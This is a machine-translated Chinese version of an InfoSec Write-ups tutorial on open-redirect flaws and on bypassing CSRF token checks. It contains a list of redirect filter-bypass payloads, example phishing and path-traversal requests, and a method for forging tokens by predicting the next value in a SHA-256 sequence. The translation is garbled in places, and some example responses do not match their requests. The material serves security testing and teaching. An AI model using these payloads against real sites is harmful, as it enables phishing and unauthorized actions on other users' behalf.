# 开放重定向和绕过 CSRF 验证-简化

> 原文：<https://infosecwriteups.com/open-redirects-bypassing-csrf-validations-simplified-4215dc4f180a?source=collection_archive---------2----------------------->

开放重定向是未经验证的重定向和转发，当 web 应用程序接受**不受信任的输入**时，可能会导致 web 应用程序将请求重定向到不受信任的输入中包含的 URL。通过修改恶意站点的不可信 URL 输入，攻击者可以成功发起网络钓鱼诈骗并窃取用户凭据。这些漏洞可能会进一步升级，从网络钓鱼攻击到目录遍历、XSS、CSRF、SSRF、OAuth 令牌泄露。等等

![](img/61233075d028f169a3506cdf21aa5172.png)

开放重定向-未验证的重定向

因为被更改的链接中的域名与原始站点无法区分，所以网络钓鱼企图看起来更可信。未经验证的重定向和转发攻击也可用于恶意创建 URL，通过应用程序的访问控制检查，然后将攻击者转发到他们通常无法访问的特权功能。— OWASP 备忘单。

## 安全重定向:

然而，通过客户端，严格硬编码到源代码中的 URL 在某种程度上是安全的，不会受到未经验证的重定向的影响。

**举例:**

。
-`response.redirect(“~/mysafe-subdomain/login.aspx”)`网络代码

Java 代码-
`response.redirect(“[http://mysafedomain.com](https://mysafedomain.com)");`

PHP 代码-
`<?php
/* browser redirections*/
header(“Location: [http://mysafedomain.com](http://mysafedomain.com)");
exit;
?>`

## 恶意 URL 重定向:

考虑一个应用程序，它依赖客户端数据来生成重定向查询，并最终将应用程序的控制权传递给恶意用户。打开了欺骗应用程序和其他用户的机会之门。

**示例:**

。
-`string url = request.queryString[“**url**”];
response.redirect(**url**);`网码

在这里，`url`是从一个 *GET* 或 *POST* query &将用户重定向到目的地。

应用程序接受以下输入:

`GET /mysafe-subdomain?**url=same-safe-domain/index.aspx**
Host: mysafedomain.com
HTTP/1.1 302 Object moved
Location: [**http://mysafedomain.com/**](https://mysafedomain.com/)`

骗子可以将请求更改为:

`GET /mysafe-subdomain?**url=.notsafedomain/donate.plz**
Host: mysafedomain.com
HTTP/1.1 302 Object moved
Location: [**http://safedomain.com/**](https://mysafedomain.com/)`

这将导致重定向到:

`http://safedomain.com.notsafedomain/donate.plz`

运筹学

`GET /mysafe-subdomain?**url=http://not-so-safedomain/donate.plz**
Host: mysafedomain.com
HTTP/1.1 302 Object moved
Location: [**http://notsafedomain.com/**](https://mysafedomain.com/)`

因为请求来自受信任的域，所以浏览器会将查询作为有效查询来执行。

运筹学

应用程序接受以下输入:

`POST /mysafe-subdomain/User HTTP 1.1
Host: mysafedomain.com
HTTP/1.1 302 Object moved
Location: [https://mysafedomain.com/](https://mysafedomain.com/)
**url=mysafe-subdomain/editDetails.aspx**`

骗子可以将请求更改为:

`POST /mysafe-subdomain/User HTTP 1.1
Host: mysafedomain.com
HTTP/1.1 302 Object moved
Location: [https://mysafedomain.com/](https://mysafedomain.com/)
**url=https://notsafedomain/pay-to-continue.plz**`

运筹学

`POST /mysafe-subdomain/User HTTP 1.1
Host: mysafedomain.com
HTTP/1.1 302 Object moved
Location: [https://mysafedomain.com/](https://mysafedomain.com/)
**url=/../../internal-files/hidden.keys**`

## 如何检查应用程序是否容易受到开放重定向的攻击？

步骤:

1.  查找应用程序中发生的每个重定向实例。
    查找 *3xx 状态码*和*位置*表头
    
2.  使用 *refresh* header，在固定的时间间隔后，用任意 URL 重新加载页面，您可以将时间间隔设置为 0，触发立即重定向。
    `HTTP/1.1 200 OK
    Refresh: 0;
    url=[http://mysafedomain.com/index.html](http://my-safedomain.com/index.html)`
3.  检查 HTML *< meta >* 标签，复制任何 HTTP 头的行为，进行重定向。
    `HTTP/1.1 200 OK
    Content-Length: 123
    <html>
    <head>
    <meta http-equiv=”refresh” content=”0;
    url=[http://mysafedomain.com/index.html](http://my-safedomain.com/index.html)">
    </head>
    </html>`
4.  检查 JavaScript 中用于将浏览器重定向到任意 URL 的 API。
    `HTTP/1.1 200 OK
    Content-Length: 123
    <html>
    <head>
    <script>
    document.location=”[http://mysafedomain.com/index.html](http://mysafedomain.com/index.html)";
    </script>
    </head>
    </html>`

在上述场景中，用您的 URL 替换安全重定向 URL，并相应地修改请求。如果应用程序被重定向到修改过的目的地，它肯定是易受攻击的。

应用程序可能正在实现到绝对 URL 的重定向，尝试用外部域替换绝对 URL 以检查它是否重定向，或者用外部域的绝对 URL 替换相对 URL 以测试它是否重定向。

此外，应用程序可能会通过阻止绝对 URL 来执行检查或将特定模式列入黑名单。您可以尝试将 URL 修改为:

`HtTp://notsafedomain.com
%00http://notsafedomain.com
(space)http://notsafedomain.com
//notsafedomain.com
(“http://” encoded) %68%74%74%70%3a%2f%2fnotsafedomain.com
(“http://” double-encoded) %2568%2574%2574%2570%253a%252f%252fnotsafedomain.com
https://notsafedomain.com
http:\\notsafedomain.com
http:///notsafedomain.com
http://http://notsafedomain.com
http://notsafedomain.com/http://notsafedomain.com
hthttp://tp://notsafedomain.com
http:/mysafedomain.com.notsafedomain.com
http://notsafedomain.com/?http://safedomain.com
http://notsafedomain.com/%23http://safedomain.com`

在重定向是通过从 DOM 请求数据的客户端 JavaScript 执行的情况下，重定向的代码通常在客户端是可见的。寻找下面可能执行重定向的 JavaScript APIs:

`>document.location
>document.URL
>document.open()
>window.location.href
>window.navigate()
>window.open()`

![](img/45d4f129288982dc8ebdcac8ae0a23ce.png)

冲浪运动

## 绕过 CSRF 验证:

为了防止应用程序被重定向到随机 URL，应用程序实现了 CSRF 令牌。颁发 CSRF 令牌并不意味着应用程序对 CSRF 是安全的。

您可以检查颁发的令牌的有效性，并使用规定的方法绕过验证和测量，如下所示:

1.  检查是否有任何 CSRF 代币发行。否则，应用程序肯定容易受到 CSRF 的攻击。
2.  检查是否设置了适当的措施来验证令牌&并相应地寻找响应。
3.  通过代理拦截请求并修改它。尝试发送一个没有 CSRF 令牌的请求。如果请求被接受，应用程序无疑会发出一个令牌，但不会验证它。
4.  尝试使用空白 CSRF 令牌发送请求。如果成功，应用程序再次无法验证令牌的值。
5.  尝试使用随机 CSRF 令牌发送请求，遵循应用程序实现的模式来颁发令牌。如果成功，应用程序会根据有效的令牌错误地验证令牌的值。
6.  检查应用程序是否接受来自过期用户会话的 CSRF 令牌。登录应用程序，捕获 CSRF 令牌。从应用程序注销并重新登录(确保从浏览器中删除本地缓存的数据和 cookie 值),并用之前的令牌值替换 CSRF 令牌。这里，问题在于令牌的到期时间。
7.  尝试使用您的有效 CSRF 令牌向另一个用户发送修改后的请求。获取您的令牌，并尝试对另一个用户进行验证。这表明颁发的 CSRF 令牌没有针对特定用户会话进行验证。相反，它被单独验证为被接受的令牌。
8.  检查应用程序是否容易受到动词篡改的影响，用 GET 替换 POST，反之亦然，然后提交请求。检查它是否被接受为有效请求。
9.  解码 CSRF 令牌使用的模式，并相应地生成有效 CSRF 令牌的下一序列。
    **举例:**如果发布的令牌使用- *`54adb3bf6a47a24f636213c6bb5b7537c504e997867633756826cee0c4bbbb55`
    对上述令牌进行解码，我们得到值-`**19800765367890026786**`
    将其递增为`**19800765367890026787, 19800765367890026788, 19800765367890026789**`，以此类推。
    在 SHA-256 将其编码为—
    `***19800765367890026787:****82b676033b162958cc97f4690ad01b5c007772b42763be6fe25693f6983f0219* ***19800765367890026788:****9e9589ba387c8a368ff7a4db21618d7af01288c6b234ce2beb7d162e38336602* ***19800765367890026789:****faa9e8d6270703700bd02ae6f7d1d6bebfe25e2530d7fd5f005b1c1aab896e68*`
    尝试使用上述令牌作为 CSRF 令牌。*
10.  *检查 cookie 属性是否用于创建 CSRF 令牌。如果应用程序易受标头注入的影响。这可能会导致反 CSRF 绕过，因为攻击者可以修改自己的 cookie。*
11.  *仔细观察 CSRF 令牌，它们可能有一个静态值&一个动态值。尝试仅使用 CSRF 令牌的静态值发送修改后的请求。检查它的所有内容是否都经过正确验证。*

***有关开放重定向的更多示例负载，请参考 Pentester Land:备忘单:***

*[](https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html) [## 打开重定向备忘单

### 嗨，这是一个开放重定向漏洞的备忘单。这是初稿。我会在每次发现一个…

彭特斯.兰](https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html) 

再见。*